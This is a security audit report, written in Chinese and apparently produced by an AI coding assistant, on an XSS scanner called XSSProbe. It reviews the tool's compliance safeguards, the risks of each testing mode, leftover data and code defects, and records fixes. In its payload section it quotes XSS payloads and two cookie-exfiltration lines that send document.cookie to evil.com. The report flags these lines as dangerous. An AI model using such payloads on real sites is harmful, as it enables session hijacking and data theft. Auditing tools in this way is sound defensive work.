# XSSProbe 安全审计报告

**审计日期**: 2026-06-05
**审计范围**: 全部源代码、配置文件、文档
**项目版本**: main 分支 (commit c8b2d12)

---

## 📊 总体评估

| 维度 | 评级 | 说明 |
|------|------|------|
| **安全合规性** | ✅ 良好 | 完善的合规框架，但有改进空间 |
| **对被测系统影响** | ⚠️ 可控 | 默认安全，但高风险模式需谨慎 |
| **数据残留风险** | ⚠️ 中等 | 存储型测试可能留下测试数据 |
| **代码质量** | ✅ 良好 | 架构清晰，模块化设计 |

---

## 1. 安全合规性审计

### ✅ 已实现的安全机制

| 机制 | 实现位置 | 评估 |
|------|----------|------|
| **法律声明** | `compliance/legal.go` | 中英双语，强制确认 |
| **域名范围锁定** | `compliance/scope.go` | 防止越界扫描 |
| **速率限制** | `compliance/ratelimit.go` | 令牌桶算法，默认2 req/s |
| **robots.txt遵守** | `compliance/robots.go` | 默认开启 |
| **审计日志** | `compliance/audit.go` | JSON格式，自动启用 |
| **安全模式** | `safety/safety.go` | DryRun/Safe/Confirm三级保护 |

### ⚠️ 发现的问题

#### 1.1 法律确认可被绕过
```go
// compliance/legal.go:13-17
func ConfirmLegalUsage(skipConfirm bool) bool {
    if skipConfirm {
        return true  // -yes 标志直接跳过
    }
    ...
}
```

**风险**: 用户使用 `-yes` 可跳过法律确认
**缓解措施**: 已实现 `-yes` 需要 `-scope` 配合使用
```go
// main.go:86-90
if *skipLegal && *scope == "" {
    fmt.Fprintln(os.Stderr, "[!] Error: -yes requires -scope to prevent blind scanning.")
    os.Exit(1)
}
```

**建议**: 考虑增加更强的授权验证，如要求用户提供授权书编号或测试授权文件

#### 1.2 审计日志位置不够明显
```go
// main.go:161-164
if *auditLog == "" && (*verify || *stored || *crawl) {
    *auditLog = "xssprobe_audit.jsonl"  // 当前目录
}
```

**建议**: 使用更明显的路径，如 `~/.xssprobe/audit/` 或用户文档目录

---

## 2. 对被测试系统的影响评估

### 🟢 低风险模式（默认/静态分析）

**行为**: 只读取页面内容，不发送任何payload
**影响**: 无 - 仅HTTP GET请求

```go
// fetcher/fetcher.go:12-30
func FetchPage(url string) (string, error) {
    client := &http.Client{Timeout: 15 * time.Second}
    resp, err := client.Get(url)  // 只读请求
    ...
}
```

### 🟡 中等风险模式（反射型验证 -verify）

**行为**: 在URL参数/hash中注入payload
**影响**: 可控 - payload设计为无害检测

#### payload安全性分析

| payload类型 | 示例 | 风险等级 | 说明 |
|-------------|------|----------|------|
| **基础弹窗** | `alert(1)` | 🟢 无害 | 只触发浏览器弹窗 |
| **Canary检测** | `xXssCanary42x` | 🟢 无害 | 纯文本标记 |
| **WAF绕过** | `<img src=x onerror=alert(1)>` | 🟢 无害 | 仍只执行alert |
| **数据外泄** | `fetch('http://evil.com/...')` | 🔴 高危 | **向外部发送数据** |

**关键发现**:
```go
// payloads/payloads.go:454-467
// === Data Exfiltration ===
exfil := []string{
    `<img src="http://evil.com/?c='+document.cookie+'">`,
    `<script>fetch('http://evil.com/?c='+document.cookie)</script>`,
    ...
}
```

**⚠️ 严重问题**: 内置payload包含向 `evil.com` 发送数据的示例，如果用户直接使用，可能：
1. 泄露目标系统的cookie等敏感信息到外部
2. 违反数据保护法规

**建议**:
1. 移除或默认禁用数据外泄payload
2. 使用本地检测机制替代外部请求
3. 在使用此类payload前增加明确警告

#### 速率限制评估

```go
// compliance/ratelimit.go:18-27
func NewRateLimiter(ratePerSecond int) *RateLimiter {
    if ratePerSecond <= 0 {
        ratePerSecond = 1  // 最低1 req/s
    }
    ...
}
```

**评估**: 速率限制实现正确，但用户可设置为较高值
**建议**: 增加上限限制，如最大100 req/s

### 🔴 高风险模式（存储型XSS -stored）

**行为**: 提交payload到服务器表单
**影响**: 可能留下测试数据

#### 安全机制分析

```go
// main.go:242-248
// 如果stored模式没有指定任何安全标志，默认使用dry-run
if *stored && !*dryRun && !*safePayloads && !*confirm {
    safetyMode.DryRun = true
    safetyMode.Safe = true
    safetyMode.Confirm = true
    fmt.Println("[*] Stored XSS: dry-run mode enabled (no data will be submitted)")
}
```

**评估**: 默认安全设计良好

#### Safe模式payload分析

```go
// safety/safety.go:60-76
func GetSafePayloads() []string {
    return []string{
        GenerateSafeCanary(),  // XSSPROBE_TEST_<timestamp>
        "<XSSPROBE_TEST>",
        `"XSSPROBE_TEST"`,
        `'XSSPROBE_TEST'`,
        `XSSPROBE<TEST>"'&`,
        `XSSPROBE_T€ST`,
        "XSSPROBE\x00TEST",
    }
}
```

**评估**: Safe模式payload无害，只是测试字符串

#### ⚠️ 持久化数据风险

**问题**: 如果使用非dry-run模式提交数据：
1. payload会被存储在目标服务器数据库中
2. 没有自动清理机制
3. 测试数据可能永久存在

**建议**:
1. 增加自动清理提醒
2. 在报告中明确列出所有提交的数据
3. 提供清理脚本或指南

---

## 3. 数据残留分析

### 3.1 在被测试系统上的残留

| 模式 | 残留风险 | 说明 |
|------|----------|------|
| 静态分析 | 🟢 无 | 只读请求 |
| 反射型验证 | 🟢 无 | URL参数不存储 |
| 存储型(dry-run) | 🟢 无 | 不提交数据 |
| 存储型(safe) | 🟡 低 | 提交无害测试字符串 |
| 存储型(自定义) | 🔴 高 | 取决于payload内容 |
| 爬虫 | 🟢 无 | 只读请求 |

### 3.2 chromedp浏览器残留

```go
// verifier/verifier.go:163-213
func newChromeContext(...) (context.Context, context.CancelFunc) {
    opts := append(chromedp.DefaultExecAllocatorOptions[:],
        chromedp.Flag("headless", true),
        chromedp.Flag("disable-gpu", true),
        chromedp.Flag("no-sandbox", true),  // ⚠️ 禁用沙箱
    )
    ...
    // 每次创建新实例，关闭后清理
    combinedCancel := func() {
        taskCancel()
        allocCancel()
    }
    ...
}
```

**评估**:
- ✅ 每次创建新的浏览器实例
- ✅ 关闭时自动清理
- ⚠️ `--no-sandbox` 降低安全性（为了兼容性）
- ⚠️ 临时文件可能残留在 `/tmp` 目录

### 3.3 本地系统残留

| 文件 | 位置 | 说明 |
|------|------|------|
| 审计日志 | `./xssprobe_audit.jsonl` | 记录所有请求 |
| chromedp临时文件 | `/tmp/` | 重启后清理 |
| 预编译二进制 | `./xssprobe` | 包含调试信息 |

**建议**:
1. 文档中说明临时文件位置
2. 提供清理命令
3. 发布版本strip调试信息

---

## 4. 代码安全问题

### 4.1 全局变量竞争条件

```go
// verifier/verifier.go:44-48
var (
    customPayloads      []payloads.Payload
    customPayloadsFirst bool
    hasCustomPayloads   bool
)
```

**问题**: 全局变量，多线程批量扫描时可能存在竞争条件
**影响**: 批量扫描时custom payload可能被错误应用
**建议**: 使用mutex保护或改为参数传递

### 4.2 CORS禁用选项

```go
// verifier/verifier.go:36-41
var disableCORSFlag bool

func SetDisableCORS(disable bool) {
    disableCORSFlag = disable
}
```

**风险**: 禁用浏览器同源策略可能导致：
1. 访问其他域的敏感数据
2. 绕过安全策略

**建议**: 增加更明显的警告，或限制使用场景

### 4.3 错误处理

```go
// verifier/verifier.go:199-204
if err := chromedp.Run(taskCtx, actions...); err != nil {
    // Auth setup failed, continue without auth
    fmt.Printf("  [!] Warning: auth setup failed: %v\n", err)
}
```

**问题**: 认证失败时静默继续，可能导致测试结果不准确
**建议**: 增加选项让用户选择失败时是否继续

### 4.4 依赖安全

**主要依赖**:
- `github.com/chromedp/chromedp` - headless Chrome控制
- `github.com/gobwas/ws` - WebSocket库
- `github.com/go-json-experiment/json` - JSON库

**建议**: 
1. 定期运行 `go mod verify`
2. 使用 Dependabot 或类似工具检查漏洞
3. 锁定依赖版本

---

## 5. 改进建议

### 🔴 高优先级

1. **移除或限制数据外泄payload**
   ```go
   // 建议：默认禁用，需要显式启用
   if enableExfilPayloads {
       payloads = append(payloads, GetExfilPayloads()...)
   }
   ```

2. **增加授权验证机制**
   - 要求用户提供授权文件或测试范围声明
   - 记录授权信息到审计日志

3. **修复全局变量竞争条件**
   ```go
   // 改为函数参数传递
   func VerifyURL(..., customPayloads []payloads.Payload) []VerifyResult {
   }
   ```

### 🟡 中优先级

4. **增加存储型测试清理提醒**
   - 测试完成后提示用户清理测试数据
   - 提供清理SQL/脚本模板

5. **改进审计日志位置**
   - 使用 `~/.xssprobe/audit/` 目录
   - 或使用系统日志目录

6. **增加速率限制上限**
   ```go
   if ratePerSecond > 100 {
       ratePerSecond = 100
       fmt.Println("[!] Rate limit capped at 100 req/s")
   }
   ```

### 🟢 低优先级

7. **strip发布二进制的调试信息**
   ```bash
   go build -ldflags="-s -w" -o xssprobe .
   ```

8. **增加URL格式验证**

9. **文档中说明临时文件位置和清理方法**

10. **增加更详细的错误提示**

---

## 6. 合规性检查清单

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 法律声明 | ✅ | 中英双语，强制确认 |
| 授权验证 | ⚠️ | 有scope限制，但可绕过 |
| 速率限制 | ✅ | 令牌桶算法，默认2 req/s |
| robots.txt | ✅ | 默认遵守 |
| 审计日志 | ✅ | JSON格式，自动启用 |
| 域名范围 | ✅ | -scope 限制 |
| 安全默认值 | ✅ | 存储型默认dry-run |
| 数据清理提醒 | ❌ | 缺少 |

---

## 7. 结论

### 整体评价

XSSProbe 在安全合规方面做了大量工作，整体设计良好：

**优点**:
- 完善的合规模块（scope、rate-limit、robots、audit、legal）
- 存储型XSS默认dry-run，安全第一
- 安全的canary payload设计
- 审计日志自动启用

**需要改进**:
- 数据外泄payload存在风险
- 缺少数据清理机制
- 全局变量竞争条件
- 授权验证可被绕过

### 使用建议

1. **始终使用 `-scope` 限定扫描范围**
2. **存储型测试先用 `-dry-run` 模式**
3. **避免使用数据外泄payload，或使用自定义安全payload**
4. **测试完成后清理提交的测试数据**
5. **定期检查审计日志**

---

## 8. 已修复问题 (2026-06-05)

| 问题 | 修复方案 | 状态 |
|------|----------|------|
| 数据外泄payload风险 | 标记为Dangerous，默认禁用，使用占位符域名 | ✅ 已修复 |
| 全局变量竞争条件 | 改为PayloadConfig参数传递 | ✅ 已修复 |
| 缺少清理提醒 | 添加PrintCleanupReminder函数 | ✅ 已修复 |
| 速率限制无上限 | 添加MaxRateLimit=100 req/s | ✅ 已修复 |
| CI配置调试信息 | release.yml已使用-ldflags="-s -w" | ✅ 已确认 |

### 修复详情

1. **数据外泄payload** (`payloads/payloads.go`)
   - 添加`Dangerous`字段标记高危payload
   - 将`evil.com`替换为`YOUR_DOMAIN.example`占位符
   - `GetAllPayloads()`默认不包含危险payload
   - 添加`IsDangerousPayload()`检查函数
   - 自定义payload使用前检查外泄模式

2. **竞争条件** (`verifier/verifier.go`)
   - 移除全局变量`customPayloads`等
   - 创建`PayloadConfig`结构体
   - 所有函数改为参数传递

3. **清理提醒** (`verifier/verifier.go`)
   - 添加`PrintCleanupReminder()`函数
   - 存储型测试后显示清理建议

4. **速率限制** (`compliance/ratelimit.go`)
   - 添加`MaxRateLimit = 100`常量
   - 超限时自动cap并提示

---

**审计人**: Claude Code Security Audit
**审计工具**: 静态代码分析 + 人工审查
